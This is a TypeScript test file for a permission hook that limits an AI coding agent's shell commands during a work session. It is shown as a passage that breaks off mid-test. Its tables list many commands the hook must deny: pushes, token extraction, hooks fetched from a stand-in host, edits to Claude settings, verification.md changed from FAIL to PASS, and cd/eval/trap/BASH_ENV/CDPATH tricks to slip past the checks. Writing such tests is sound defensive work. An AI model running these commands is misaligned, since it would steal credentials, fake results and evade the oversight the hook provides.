// M09 G2 루프 잠금 노드 — 작업 노드 세션의 원격 쓰기·자격 꺼내기·설정 심기·실행기 몫 파일 쓰기를 질문 없이 거부하고,
// 로컬 작업(상태 보기·커밋·노드 문서 쓰기·읽기 명령)은 지나가는지 표로 고정한다. 판정은 명령 글자의 겹이다(loopLock.ts 머리 주석).
import { describe, it, expect } from 'vitest'
import {
  buildLoopLockHook,
  loopCommandReason,
  loopLockReason,
  loopPathReason,
  LOOP_LOCK_NODE,
  type LoopLockScope,
} from '@main/04_Claude/permission/loopLock'
import { listControlNodes } from '@main/04_Claude/permission/controlNodes'

const TEMP = 'C:\\Users\\u\\AppData\\Local\\Temp'
const SCOPE: LoopLockScope = {
  repoRoot: 'C:\\work\\repo',
  appLoopDir: 'C:\\Users\\u\\AppData\\Roaming\\agentdeck\\loop',
  tempDirs: [TEMP],
  vars: {
    APPDATA: 'C:\\Users\\u\\AppData\\Roaming', LOCALAPPDATA: 'C:\\Users\\u\\AppData\\Local',
    HOME: 'C:\\Users\\u', USERPROFILE: 'C:\\Users\\u', TEMP, TMP: TEMP,
  },
}

const DENY_REMOTE = [
  'git push',
  'git push origin HEAD:main',
  'git push --force origin feat/x',
  'git -C ../other push',
  'git -c core.quotepath=false push origin x',
  'git --git-dir=.git push',
  'git --git-dir .git --work-tree . push',
  '"C:/Program Files/Git/cmd/git.exe" push',
  '/usr/bin/git push',
  'GIT PUSH',
  'Git Push origin main',
  'git status && git push',
  'git add . ; git push',
  'echo hi | git push',
  'git commit -m x\ngit push',
  'echo $(git push)',
  'git commit -m "x $(git push)"',
  'echo "`git push`"',
  'bash -c "git push"',
  "sh -c 'git push origin main'",
  'cmd /c git push',
  'powershell -Command "git push"',
  'sudo git push',
  'env FOO=1 git push',
  'timeout 10 git push',
  'git-push origin main',
  'git send-pack origin main',
  'git -c alias.p=push p',
  'git remote add evil https://example.com/x.git',
  'git remote set-url origin https://example.com/x.git',
  'git remote remove origin',
  'git remote rename origin up',
  'gh pr create --fill',
  'gh pr merge 1',
  'gh pr close 1',
  'gh pr edit 1 --title x',
  'gh pr comment 1 -b x',
  'gh pr review 1 --approve',
  'gh pr ready 1',
  'gh -R o/r pr create',
  'GH PR CREATE',
  'gh.exe pr create',
  'gh repo create x --private',
  'gh repo edit --visibility public',
  'gh repo delete o/r --yes',
  'gh repo rename y',
  'gh repo archive',
  'gh release create v1',
  'gh workflow run ci.yml',
  'gh secret set X',
  'gh variable set X',
  'gh api -X POST repos/o/r/pulls',
  'gh api --method PATCH repos/o/r',
  'gh api --method=DELETE repos/o/r',
  'gh api -XPUT repos/o/r/topics',
  'gh api -X post repos/o/r/issues',
  'gh api repos/o/r/issues -f title=x',
  'gh api repos/o/r/issues -F n=1',
  'gh api repos/o/r/issues --input body.json',
  "gh api graphql -f query='mutation { x }'",
  'git status; gh pr create --fill',
  'git lfs push origin main',
  "git submodule foreach 'git push'",
  'gh pr create --title x --body -h',
  'gh pr create --help',
  // 원격 쓰기 숨김 (G2 검수 중요 8) — 값으로 받은 명령을 다시 판독하고, 명령을 실행하는 -c 키는 거부한다
  'git rebase -x "git push" HEAD~1',
  'git rebase --exec="git push" main',
  'git bisect run git push',
  'git subtree push --prefix=x origin main',
  'git -c core.pager="git push" log',
  'git -c core.fsmonitor=x status',
  'git -c filter.x.clean=cat add .',
  'git -c diff.x.textconv=cat diff',
  'git -c include.path=/tmp/x status',
  'git -c includeIf.onbranch:main.path=x status',
  'git -c gpg.program=x commit -m x',
  'git -c protocol.ext.allow=always fetch',
  'git -c sequence.editor=x rebase -i HEAD~2',
  'git -c core.editor=x commit',
  'git -c diff.external=x diff',
]

const DENY_CREDENTIAL = [
  'gh auth token',
  'gh auth status',
  'gh auth login --with-token',
  'gh auth setup-git',
  'git credential fill',
  'git credential-manager get',
  'git-credential-manager get',
  'git-credential-manager.exe get',
  'credential-manager get',
  'git -c credential.helper=manager fetch',
  'GH_TOKEN= gh api user',
  'GH_TOKEN=abc',
  'gh_token=x gh api user',
  'export GITHUB_TOKEN=x',
  'GH_CONFIG_DIR=/home/u/.config/gh gh pr list',
  'GIT_CONFIG_GLOBAL=~/.gitconfig git fetch',
  'GIT_CONFIG_COUNT=0 git fetch',
  'GIT_CONFIG_NOSYSTEM=0 git fetch',
  'GCM_CREDENTIAL_STORE=wincred git fetch',
  'env -u GH_TOKEN gh api user',
  'env --unset=GH_CONFIG_DIR gh api user',
  'env -i bash',
  'unset GH_TOKEN',
  'unset GH_CONFIG_DIR GCM_INTERACTIVE',
  'git status && unset GH_TOKEN && gh api user',
  '$env:GH_TOKEN = ""',
  'Remove-Item Env:\\GH_TOKEN',
  '[Environment]::SetEnvironmentVariable("GH_TOKEN", $null)',
  'git --config-env=credential.helper=X fetch',
  'setx GH_TOKEN x',
  'env -uGH_TOKEN gh api user',
]

const DENY_CONFIG = [
  'git config credential.helper manager',
  'git config --global core.sshCommand ssh',
  'git config --add x.y z',
  'git config --unset credential.helper',
  'git config set core.hooksPath x',
  'git config -e',
  'git -C . config user.name x',
  'echo "#!/bin/sh" > .git/hooks/pre-commit',
  'echo x>.git/hooks/pre-commit',
  'cat a >> .git/config',
  'cp evil .git/hooks/post-commit',
  'tee .git/info/exclude',
  'sed -i s/x/y/ .git/config',
  'rm .git/info/exclude',
  'chmod +x .git/hooks/pre-push',
  'Set-Content .git\\config x',
  'echo x > .GIT/CONFIG',
  'dd if=x of=.git/config',
  // .git 안 전체 (G2 검수 중요 7) — 폴더로 복사, -t, PowerShell 이름 인자, >|·>&, 내려받기·풀기
  'echo x > .git/refs/heads/main',
  'cp hook .git/',
  'cp -r hooks .git',
  'cp -t .git/hooks pre-push',
  'Copy-Item -Destination .git\\config -Path x',
  'Copy-Item x -Destination:.git/config',
  'echo x >| .git/config',
  'echo x >&.git/config',
  'curl -o .git/hooks/pre-push https://example.com/x',
  'curl -sSLo .git/hooks/pre-push https://example.com/x',
  'wget -O .git/config https://example.com/x',
  'tar -xf h.tar -C .git/hooks',
  'unzip -d .git/hooks h.zip',
  'echo x > "\\\\?\\C:\\work\\repo\\.git\\config"',
]

const DENY_OUTSIDE = [
  'echo "[credential]" >> ~/.gitconfig',
  'echo x > $HOME/.gitconfig',
  'echo x > ${HOME}/.gitconfig',
  'echo x > %USERPROFILE%\\.gitconfig',
  'cp evil C:/Users/u/.gitconfig',
  'echo x > ../other/file',
  'echo x > C:/elsewhere/x',
  'echo x > $SOMEVAR/x',
  'tee ~/.claude/settings.json',
  'cd ~ && echo x > .gitconfig',
  'cd /c/Users/u && touch x',
]

const DENY_CLAUDE = [
  'echo {} > .claude/settings.json',
  'echo {} > .claude/settings.local.json',
  'echo {} > .mcp.json',
  'git checkout main -- .claude/settings.json',
  'git restore --source=HEAD~3 .claude/settings.json',
  'rm -rf .claude',
  'cp evil.json .claude/',
]

const DENY_EXECUTOR_FILES = [
  'echo {} > .agentdeck/run-state.json',
  'echo x > ./.agentdeck/run-state.json',
  'echo x > .agentdeck\\run-state.json',
  'rm .agentdeck/run-state.json',
  'mv x .agentdeck/verification.md',
  "sed -i 's/FAIL/PASS/' .agentdeck/verification.md",
  'cp /tmp/s .agentdeck/run-state.json',
  'rm -rf .agentdeck',
  'tee -a .agentdeck/verification.md',
  'rm .agentdeck/*',
  'git clean -fdx',
  'git clean -X -f',
  'echo x > C:/Users/u/AppData/Roaming/agentdeck/loop/digests/k',
  'rm -rf /c/Users/u/AppData/Roaming/agentdeck/loop',
  'echo x > "C:\\work\\repo\\.agentdeck\\run-state.json"',
  "perl -pi -e 's/FAIL/PASS/' .agentdeck/verification.md",
  // 셸 위치를 모른다 (G2 검수 중요 2) — cd로 보호 폴더에 들어가는 꼴과 맨 이름
  'cd .agentdeck && echo {} > run-state.json',
  'pushd .git && echo x >> config',
  'Set-Location .agentdeck; Set-Content run-state.json x',
  'sl .git',
  'echo {} > run-state.json',
  'echo x >> verification.md',
  'cp x .agentdeck/',
  'git checkout HEAD -- .agentdeck/run-state.json',
  // 변수 꼴을 펼쳐 앱 영역을 본다 (G2 검수 중요 6)
  'echo x > $APPDATA/agentdeck/loop/digests/k',
  'echo x > %APPDATA%\\agentdeck\\loop\\k',
  'Set-Content $env:APPDATA\\agentdeck\\loop\\k x',
]

const ALLOW = [
  'git status',
  'git diff --stat',
  'git log --oneline -5',
  'git add -A',
  'git commit -m "feat: x"',
  'git branch',
  'git branch -a',
  'git checkout -b feat/x',
  'git switch main',
  'git fetch origin',
  'git clean -fd',
  'git remote -v',
  'git remote get-url origin',
  'git -c core.quotepath=false diff',
  'git config --get user.name',
  'git config --list',
  'git config user.email',
  'git config get user.name',
  'git commit -m "docs: git push는 실행기가 한다"',
  "git commit -m 'gh pr create 안 함'",
  'grep -r "gh pr create" .',
  'gh pr view 1',
  'gh pr list',
  'gh pr checks 1',
  'gh api repos/o/r/pulls',
  'gh api -X GET repos/o/r',
  'cat .agentdeck/verification.md',
  'cat .agentdeck/run-state.json | jq .',
  'cat .git/config',
  'ls .git/hooks',
  'echo x > .agentdeck/goals/g1.md',
  'echo x >> .agentdeck/decisions.md',
  'echo x > .agentdeck/milestone-spec.md',
  'npm test 2>&1',
  'git status 2>&1 | head',
  'echo GH_TOKEN=x',
  'rm -rf node_modules',
  'rm *.md',
  'echo push > notes.txt',
  // 저장소 밖이어도 OS 임시 폴더와 널 장치는 쓴다
  'echo x > /tmp/msg.txt',
  'echo x > C:/Users/u/AppData/Local/Temp/x.txt',
  'echo x > $TEMP/x',
  'npm test > /dev/null 2>&1',
  'Write-Output x > $null',
  // 오탐 풀기 (G2 검수 사소) — dry-run과 gh 설정 읽기
  'git clean -n -x',
  'git clean -nfdx',
  'gh config get git_protocol',
  'cd src && npm test',
  'cp a.txt b.txt',
  'cp a.txt src/',
  'curl -o out.json https://example.com/x',
  'tar -xf a.tar -C build',
  'git checkout -- src/a.ts',
  'git restore src/a.ts',
  'git -c core.quotepath=false status',
  'git rebase -i HEAD~2',
  // G2 재검수 중요 C — 셸 위치를 명령 안에서 따라간다. 알려진 위치에서 풀어 저장소 안이면 지나가고, 읽기는 막지 않는다
  'cd src && npm test && cd ..',
  'cd .agentdeck/goals && ls',
  'cd x && grep -r y --exclude-dir=.git .',
  'cd "$(git rev-parse --show-toplevel)"',
  'cd "$(git rev-parse --show-toplevel)" && echo x > notes.txt',
  'cd $(git rev-parse --show-toplevel) && npm test',
  'cd `git rev-parse --show-toplevel`',
  'cd src && cat ../.agentdeck/verification.md',
  'cd src && echo x > out.txt',
  'cd src && rm -rf build',
  'cd .agentdeck/goals && echo x > g2.md',
  'cd src && cd ../.agentdeck/goals && ls',
  // cd -·맨 cd·popd는 거부하지 않고 위치를 「모름」으로 둔다 — 그 뒤 읽기와 절대 경로 쓰기는 지나간다
  'cd -',
  'cd',
  'cd - && ls',
  'cd && ls',
  'popd',
  'cd - && echo x > /tmp/x',
  'Pop-Location',
  // git rm --cached는 작업 트리를 지우지 않는다
  'git rm --cached .env',
  'git rm -r --cached dist',
  'git rm -r --cached .',
  // 교체 참조 읽기는 막지 않는다
  'git for-each-ref refs/replace/',
  'git update-ref refs/heads/x HEAD',
  // 저장소 안 패키지 설치와 전역 읽기는 막지 않는다
  'npm install',
  'npm i -D vitest',
  'npm ci',
  'npm ls -g',
  'npm root -g',
  'pnpm add zod',
  'yarn add zod',
  'yarn global list',
  // 저장소 안의 알려진 위치에서 대상 없이 풀기·내려받기는 지나간다(지우기가 아니다)
  'tar -xf a.tar',
  'tar xzf a.tgz',
  'unzip a.zip',
  'unzip -l a.zip',
  'curl -LO https://example.com/x.tgz',
  'wget https://example.com/x',
  'cd src && tar -xf a.tar',
]

// G2 재검수 중요 C — 위치를 따라가도 보호 폴더·저장소 밖·모르는 위치의 상대 쓰기는 막는다
const DENY_CWD = [
  'cd ..',
  'cd src && cd ../..',
  'cd .agentdeck',
  'cd .agentdeck/goals && cd ..',
  'cd .agentdeck/goals && echo {} > ../run-state.json',
  'cd .agentdeck/goals && cp x ../verification.md',
  'cd src && rm -rf ..',
  'cd src && cp x ../.git/config',
  'cd - && echo x > out.txt',
  'cd && echo x > .gitconfig',
  'cd; touch x',
  'popd && echo x > a',
  'cd - && rm -rf build',
  'cd $X',
  'cd "$(echo .git)"',
  'echo x > $OUT',
  // 실패할 수 있는 cd(;·|·||·백그라운드)는 옛 위치도 남겨 둔다
  'cd nonexist; rm -rf .',
  'cd src | true && rm -rf .',
  'true || cd src && rm -rf .',
  'cd src & rm -rf .',
  // 하위 셸의 cd는 밖으로 나오지 않는다
  '(cd src) && rm -rf .',
  '(cd src && cd ..) && cd ..',
  // 모르는 위치에서 압축 풀기·내려받기는 그 위치에 쓴다
  'cd && tar -xf a.tar',
  'cd - && unzip a.zip',
  'cd && curl -O https://example.com/x',
  'cd && wget https://example.com/x',
  // $PWD는 따라간 위치다
  'cd - && echo x > $PWD/x',
  'cd src && echo x > $PWD/../.git/config',
  // G2 3차 검수 중요 E — cd 추적기를 피하는 꼴: builtin·command 래퍼, env -C, eval, CDPATH
  'builtin cd ~/.claude && echo {} > settings.json',
  'builtin cd .git && echo x >> config',
  'builtin builtin cd .git',
  'command cd .git && echo x >> config',
  // 래퍼 뒤의 cd도 대상은 본다(`time`은 bash에선 셸 낱말이라 셸 위치를 옮긴다)
  'time cd .git && echo x >> config',
  'nohup cd .git',
  'builtin cd ..',
  'env -C .git sh -c "echo x >> config"',
  'env --chdir=.git sh -c "echo x >> config"',
  'env --chdir .git touch config',
  'env -C.git touch config',
  'env -C src sh -c "rm -rf .."',
  'sudo -D .git touch config',
  'eval "cd .git" && echo x >> config',
  "eval 'cd ..' && echo x > .gitconfig",
  'eval cd .git',
  'eval "$X" && echo x > a',
  'source ./env.sh && echo x > a',
  '. ./env.sh; touch a',
  'CDPATH=.git cd hooks && cd .. && echo x >> config',
  'export CDPATH=.git',
  'CDPATH=.git; cd hooks',
  'env CDPATH=.git bash -c "cd hooks && cd .. && echo x >> config"',
  '$env:CDPATH = ".git"',
  // 판정이 쓰는 경로 변수(PWD·TEMP·TMP·TMPDIR)를 셸에서 다시 정하는 꼴 — 판정은 따라간 위치·실제 임시 폴더로 펼친다
  'PWD=C:/Users/u; echo x > $PWD/.npmrc',
  'export PWD=C:/Users/u',
  'TMPDIR=C:/Users/u; echo x > $TMPDIR/.gitconfig',
  'export TEMP=C:/Users/u',
  'declare -x TMP=C:/Users/u',
  '$env:TEMP = "C:\\Users\\u"',
  'printf -v TMPDIR %s C:/Users/u',
  // env 옵션의 다른 철자 — 묶은 짧은 옵션, 줄인 긴 옵션, -S(문자열을 명령으로 나눈다)
  'env -vC .git touch config',
  'env --chd=.git touch config',
  'env --ch .git touch config',
  'sudo --chd .git touch config',
  'env -S "touch .git/config"',
  'env -S "git push"',
  'env -vS "git push"',
  'env --split-string="git push"',
  'env --sp "git push origin x"',
  'env -C src -S "rm -rf .."',
  // G2 4차 검수 사소 — trap 몸통과 BASH_ENV·ENV(셸이 시작할 때 읽는 파일)
  "trap 'builtin cd ~/.claude' DEBUG; echo {} > settings.json",
  "trap 'cd src' DEBUG; echo x > a",
  "trap 'git push' EXIT",
  // 몸통이 위치를 바꾸면(셸에 남아 명령마다 돈다) 거부한다
  "trap 'cd ..' DEBUG",
  "trap 'builtin cd src' DEBUG",
  'trap \'eval "$X"\' DEBUG',
  "trap '. ./go.sh' DEBUG",
  'BASH_ENV=./go.sh bash -c "echo {} > settings.json"',
  'ENV=./go.sh sh -c "touch a"',
  'env BASH_ENV=./go.sh bash -c "touch a"',
  'export BASH_ENV=./go.sh',
  'BASH_ENV=./go.sh',
  '$env:BASH_ENV = "./go.sh"',
  'declare -x ENV=./go.sh',
]

// G2 재검수 차단 A — 교체 객체(refs/replace)는 실행기 병합의 트리를 바꿔치기한다
const DENY_REPLACE = [
  'git replace abc def',
  'git replace -f abc def',
  'git replace --graft HEAD',
  'git update-ref refs/replace/abc def',
  'git update-ref --stdin',
  'echo "create refs/replace/a b" | git update-ref --stdin',
  'git fetch origin "refs/replace/*:refs/replace/*"',
  'git fetch origin +refs/*:refs/*',
  'git -c remote.origin.fetch=+refs/replace/*:refs/replace/* fetch',
  'git symbolic-ref refs/replace/x refs/heads/y',
  'git fast-import',
  'git notes --ref refs/replace/x add -m y',
  'GIT-REPLACE abc def',
]

// G2 재검수 — PATH 가로채기의 싼 구멍. 전역 패키지는 실행기가 PATH에서 찾는 git·gh 이름을 덮을 수 있다
const DENY_GLOBAL_PKG = [
  'npm install -g x',
  'npm i -g x',
  'npm -g i x',
  'npm install --global x',
  'npm i --location=global x',
  'npm install --location global x',
  'npm.cmd i -g x',
  'npm link',
  'pnpm add -g x',
  'pnpm add --global x',
  'pnpm i -g x',
  'yarn global add x',
  'bun add -g x',
  'sudo npm i -g x',
]

function table(name: string, cases: string[], expectDeny: boolean): void {
  describe(name, () => {
    for (const cmd of cases) {
      it(JSON.stringify(cmd), () => {
        const reason = loopCommandReason(cmd, SCOPE)
        if (expectDeny) expect(reason).not.toBeNull()
        else expect(reason).toBeNull()
      })
    }
  })
}

table('loop-lock — 원격 쓰기는 거부한다 (M09 G2)', DENY_REMOTE, true)
table('loop-lock — 자격 꺼내기·환경 되돌리기는 거부한다 (M09 G2)', DENY_CREDENTIAL, true)
table('loop-lock — git 설정·훅 심기는 거부한다 (M09 G2)', DENY_CONFIG, true)
table('loop-lock — 실행기 몫 파일·앱 영역 쓰기는 거부한다 (M09 G2)', DENY_EXECUTOR_FILES, true)
table('loop-lock — 작업 저장소 밖 쓰기는 거부한다 (M09 G2 검수 차단 1)', DENY_OUTSIDE, true)
table('loop-lock — Claude 설정 쓰기는 거부한다 (M09 G2 검수 중요 5)', DENY_CLAUDE, true)
table('loop-lock — 로컬 작업과 읽기는 지나간다 (M09 G2)', ALLOW, false)
table('loop-lock — 위치를 따라가도 보호 폴더·밖·모르는 위치의 상대 쓰기는 막는다 (M09 G2 재검수 중요 C)', DENY_CWD, true)
table('loop-lock — 교체 객체(refs/replace) 쓰기는 거부한다 (M09 G2 재검수 차단 A)', DENY_REPLACE, true)
table('loop-lock — 전역 패키지 설치는 거부한다 (M09 G2 재검수)', DENY_GLOBAL_PKG, true)

describe('loop-lock 셸 위치 (M09 G2 재검수 중요 C)', () => {
  it('cd 뒤 ;의 다음 명령은 그 폴더가 있을 때만 그 폴더에서 돈다고 본다 — 없으면 옛 위치도 본다', () => {
    expect(loopCommandReason('cd src; rm -rf .', SCOPE)).not.toBeNull()
    const withSrc: LoopLockScope = { ...SCOPE, isDir: (p) => p.replace(/\\/g, '/').toLowerCase() === 'c:/work/repo/src' }
    expect(loopCommandReason('cd src; rm -rf .', withSrc)).toBeNull()
    expect(loopCommandReason('cd src; npm test; cd ..', withSrc)).toBeNull()
  })

  // `&&` 줄 안의 다음 명령은 cd가 됐을 때만 돈다. 줄이 끝나면(;·개행) 줄이 멈췄을 수 있는 모든 자리를 다음 명령의 위치 후보로 둔다
  it('&& 줄이 끝난 뒤의 명령은 줄이 중간에 멈춘 자리에서도 돈다고 본다', () => {
    const withSrc: LoopLockScope = { ...SCOPE, isDir: (p) => p.replace(/\\/g, '/').toLowerCase() === 'c:/work/repo/src' }
    expect(loopCommandReason('cd nonexist && true; rm -rf .', SCOPE)).not.toBeNull()
    expect(loopCommandReason('false && cd src; rm -rf .', withSrc)).not.toBeNull()
    expect(loopCommandReason('cd src && false; rm -rf .', withSrc)).toBeNull()
    expect(loopCommandReason('cd src && npm test\nrm -rf ..', withSrc)).not.toBeNull()
    expect(loopCommandReason('(cd src && false) && rm -rf .', withSrc)).not.toBeNull()
  })

  it('조건·반복 몸통(then·do·else)의 cd는 돌지 않을 수 있다', () => {
    const withSrc: LoopLockScope = { ...SCOPE, isDir: (p) => p.replace(/\\/g, '/').toLowerCase() === 'c:/work/repo/src' }
    expect(loopCommandReason('if false; then cd src; fi; rm -rf .', withSrc)).not.toBeNull()
    expect(loopCommandReason('for d in a; do cd src; done; rm -rf .', withSrc)).not.toBeNull()
    expect(loopCommandReason('if true; then cd src && rm -rf .; fi', withSrc)).toBeNull()
    expect(loopCommandReason('if true; then cd src && true; fi; rm -rf .', withSrc)).not.toBeNull()
    expect(loopCommandReason('f() { cd src; }; rm -rf .', withSrc)).not.toBeNull()
  })

  // G2 3차 검수 중요 E — 래퍼·eval·env -C를 지나도 위치를 따라간다. 따라가서 저장소 안이면 지나간다
  it('builtin·command·eval·env -C의 cd도 따라가고, 저장소 안이면 지나간다', () => {
    const withSrc: LoopLockScope = { ...SCOPE, isDir: (p) => p.replace(/\\/g, '/').toLowerCase() === 'c:/work/repo/src' }
    expect(loopCommandReason('builtin cd src && npm test', withSrc)).toBeNull()
    expect(loopCommandReason('command cd src && rm -rf build', withSrc)).toBeNull()
    expect(loopCommandReason('builtin cd src && rm -rf ..', withSrc)).not.toBeNull()
    expect(loopCommandReason('eval "cd src" && rm -rf build', withSrc)).toBeNull()
    expect(loopCommandReason('eval "cd src" && rm -rf ..', withSrc)).not.toBeNull()
    expect(loopCommandReason('env -C src npm test', withSrc)).toBeNull()
    expect(loopCommandReason('env -C src rm -rf build', withSrc)).toBeNull()
    expect(loopCommandReason('env -C src rm -rf ..', withSrc)).not.toBeNull()
    // env -C는 그 명령의 위치만 바꾼다 — 셸은 그대로다
    expect(loopCommandReason('env -C src true; rm -rf build', withSrc)).toBeNull()
    expect(loopCommandReason('echo $CDPATH', withSrc)).toBeNull()
    expect(loopCommandReason('unset CDPATH', withSrc)).toBeNull()
    // 명령 앞 할당은 그 명령의 환경만 바꾼다(셸 변수로 남지 않고, 같은 줄의 펼치기는 옛 값이다)
    expect(loopCommandReason('TMPDIR=./tmp npm test', withSrc)).toBeNull()
    expect(loopCommandReason('HOME=/tmp/h npm test', withSrc)).toBeNull()
    expect(loopCommandReason('env -S "npm test"', withSrc)).toBeNull()
    expect(loopCommandReason('env -C src -S "npm test"', withSrc)).toBeNull()
    // trap 몸통·BASH_ENV가 있어도 쓰기가 없거나 절대 경로가 저장소 안이면 지나간다
    expect(loopCommandReason("trap 'rm -f C:/work/repo/tmp.txt' EXIT; npm test", withSrc)).toBeNull()
    expect(loopCommandReason('trap - EXIT', withSrc)).toBeNull()
    expect(loopCommandReason('trap -p', withSrc)).toBeNull()
    expect(loopCommandReason('BASH_ENV=./go.sh bash -c "npm test"', withSrc)).toBeNull()
  })

  // 래퍼(env·sudo·nohup …) 뒤의 cd는 바깥 프로그램이라 셸 위치를 바꾸지 않는다
  it('env·nohup 뒤의 cd는 셸 위치를 옮기지 않는다고 본다(옛 위치를 남긴다)', () => {
    const withSrc: LoopLockScope = { ...SCOPE, isDir: (p) => p.replace(/\\/g, '/').toLowerCase() === 'c:/work/repo/src' }
    expect(loopCommandReason('env cd src && rm -rf .', withSrc)).not.toBeNull()
    expect(loopCommandReason('nohup cd src && rm -rf .', withSrc)).not.toBeNull()
  })

  // G2 3차 검수 중요 F — 판정 때 폴더가 있어도, 같은 명령 안 앞에서 지우거나 옮기면 cd는 실패할 수 있다
  it('앞에서 그 폴더를 지우거나 옮기면(또는 무엇이든 바꿀 수 있는 명령이 돌면) 뒤의 cd는 실패할 수 있다고 본다', () => {
    const withSrc: LoopLockScope = { ...SCOPE, isDir: (p) => p.replace(/\\/g, '/').toLowerCase() === 'c:/work/repo/src' }
    expect(loopCommandReason('rm -rf src; cd src; echo x >> ../.gitconfig', withSrc)).not.toBeNull()
    expect(loopCommandReason('mv src x; cd src; echo x >> ../.gitconfig', withSrc)).not.toBeNull()
    expect(loopCommandReason('Remove-Item -Recurse src; cd src; Set-Content ../.gitconfig x', withSrc)).not.toBeNull()
    expect(loopCommandReason('git checkout other; cd src; rm -rf .', withSrc)).not.toBeNull()
    expect(loopCommandReason('npm run clean; cd src; rm -rf .', withSrc)).not.toBeNull()
    // `&&` 바로 뒤의 쓰기는 cd가 됐을 때만 돈다(그때 ../.gitconfig는 저장소 뿌리의 파일이다)
    expect(loopCommandReason('rm -rf src && cd src && echo x >> ../.gitconfig', withSrc)).toBeNull()
    expect(loopCommandReason('rm -rf src && cd src; echo x >> ../.gitconfig', withSrc)).not.toBeNull()
    // 앞 호출이 뒤에 남긴 일(백그라운드 지우기)이 시간이 지나 폴더를 지울 수 있다 — 읽기 명령이라도 앞에 돌면 cd는 실패할 수 있다
    expect(loopCommandReason('sleep 5; cd src; echo x >> ../.gitconfig', withSrc)).not.toBeNull()
    expect(loopCommandReason('git status; cd src; rm -rf .', withSrc)).not.toBeNull()
    // 뒤의 쓰기가 옛 위치에서도 무해하면 지나간다
    expect(loopCommandReason('ls; cd src; rm -rf build', withSrc)).toBeNull()
    expect(loopCommandReason('cd src; rm -rf .', withSrc)).toBeNull()
    // `&&` 바로 뒤는 cd가 됐을 때만 돈다
    expect(loopCommandReason('rm -rf src; cd src && rm -rf .', withSrc)).toBeNull()
  })

  type Out = { hookSpecificOutput?: { permissionDecision: string; permissionDecisionReason: string } }
  const signal = new AbortController().signal
  function session(scope: LoopLockScope = SCOPE): (command: string, cwd?: string) => Promise<string | null> {
    const [hook] = buildLoopLockHook(scope).hooks
    return async (command, cwd) => {
      const out = (await hook({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, ...(cwd ? { cwd } : {}) }, 't', { signal })) as Out
      return out.hookSpecificOutput?.permissionDecisionReason ?? null
    }
  }

  // 셸의 위치는 호출 사이에 남는다 — 한 호출의 cd가 다음 호출의 상대 경로를 바꾼다
  it('호출 사이에 위치를 넘긴다 — 맨 cd 뒤의 다음 호출에서 상대 경로 쓰기는 막는다', async () => {
    const call = session({ ...SCOPE, isDir: (p) => p.replace(/\\/g, '/').toLowerCase() === 'c:/work/repo' })
    expect(loopCommandReason('echo x > .gitconfig', SCOPE)).toBeNull()
    expect(await call('cd')).toBeNull()
    expect(await call('echo x > .gitconfig')).not.toBeNull()
    expect(await call('cat .gitconfig')).toBeNull()
    // 절대 경로로 돌아오면 다시 안다
    expect(await call('cd C:/work/repo')).toBeNull()
    expect(await call('echo x > notes.txt')).toBeNull()
  })

  it('훅이 주는 cwd가 지금 따라간 후보 가운데 하나면 그 위치로 좁힌다', async () => {
    const inSrc = session()
    expect(await inSrc('cd src && npm test && cd ..')).toBeNull()
    expect(await inSrc('cd ..', 'C:\\work\\repo\\src')).toBeNull()
    const atRoot = session()
    expect(await atRoot('cd src && npm test && cd ..')).toBeNull()
    expect(await atRoot('cd ..', 'C:\\work\\repo')).not.toBeNull()
  })

  it('훅이 주는 cwd가 보호 폴더면(따라가지 못한 cd) 그 위치로 본다', async () => {
    const call = session()
    expect(await call('echo x > config', 'C:\\work\\repo\\.git')).not.toBeNull()
    expect(await call('echo x > config', 'C:\\work\\repo')).toBeNull()
  })

  // G2 3차 검수 중요 E — 호출을 나눠도 builtin cd ..는 따라간다(거부되고 위치는 뿌리에 남는다)
  it('builtin cd ..는 거부되고, 다음 호출의 상대 쓰기는 뿌리 기준이다', async () => {
    const call = session()
    expect(await call('builtin cd ..')).not.toBeNull()
    expect(await call('eval "cd .."')).not.toBeNull()
    expect(await call('echo x > notes.txt')).toBeNull()
    // eval 안의 cd도 호출 사이로 넘긴다
    expect(await call('eval "cd src"')).toBeNull()
    expect(await call('rm -rf ..', 'C:\\work\\repo\\src')).not.toBeNull()
  })

  it('앞 호출의 백그라운드 지우기를 기다리는 꼴도 cd가 실패할 수 있다고 본다', async () => {
    const call = session({ ...SCOPE, isDir: (p) => p.replace(/\\/g, '/').toLowerCase() === 'c:/work/repo/src' })
    expect(await call('(sleep 3; rm -rf src) &')).toBeNull()
    expect(await call('sleep 5; cd src; echo x >> ../.gitconfig')).not.toBeNull()
  })

  it('거부된 명령의 cd는 위치를 바꾸지 않는다', async () => {
    const call = session()
    expect(await call('cd .git && ls')).not.toBeNull()
    expect(await call('echo x > config')).toBeNull()
  })

  it('[M11-G3 M09-6] 커밋 메시지 안의 CDPATH 글자는 CDPATH 설정으로 보지 않는다', () => {
    expect(loopCommandReason('git commit -m "fix: CDPATH=.git 꼴을 막는다"', SCOPE)).toBeNull()
    expect(loopCommandReason("git commit -F - <<'EOF'\nexport CDPATH=.git 막기\nEOF", SCOPE)).toBeNull()
    for (const cmd of [
      'CDPATH+=:.git; cd hooks', 'declare -x "CDPATH=.git"', 'printf -v CDPATH .git', 'bash -c "export CDPATH=.git"', 'read -r CDPATH',
      '{ CDPATH=.git; }', 'if true; then CDPATH=.git; fi', 'for i in 1; do CDPATH=.git; done', 'f() { CDPATH=.git; }', '! CDPATH=.git',
    ]) {
      expect(loopCommandReason(cmd, SCOPE)).toContain('CDPATH')
    }
  })

  it('[M11-G3 M09-6 검수] 작은따옴표 밖의 매개변수 펼치기 ${CDPATH=…}·${CDPATH:=…}도 CDPATH 설정이다', () => {
    for (const cmd of [
      ': ${CDPATH=.git}; cd hooks && echo x > pre-commit',
      ': ${CDPATH=/c/Users/u}; cd .ssh && echo x >> config',
      ': ${CDPATH:=.git}; cd hooks',
      'echo "${CDPATH=.git}"; cd hooks',
    ]) {
      expect(loopCommandReason(cmd, SCOPE)).toContain('CDPATH')
    }
    expect(loopCommandReason("git commit -m 'fix: ${CDPATH=.git} 꼴을 막는다'", SCOPE)).toBeNull()
    expect(loopCommandReason('echo ${CDPATH:-none}', SCOPE)).toBeNull()
  })

  it('[M11-G3 M09-6] source 뒤의 「위치 모름」은 다음 호출로 넘어가지 않는다 — 훅이 준 cwd가 저장소 뿌리면 상대 쓰기가 지나간다', async () => {
    const call = session()
    expect(await call('source .venv/bin/activate', 'C:\\work\\repo')).toBeNull()
    expect(await call('echo x > out.txt', 'C:\\work\\repo')).toBeNull()
    expect(await call('. .venv/bin/activate; echo x > out.txt', 'C:\\work\\repo')).not.toBeNull()
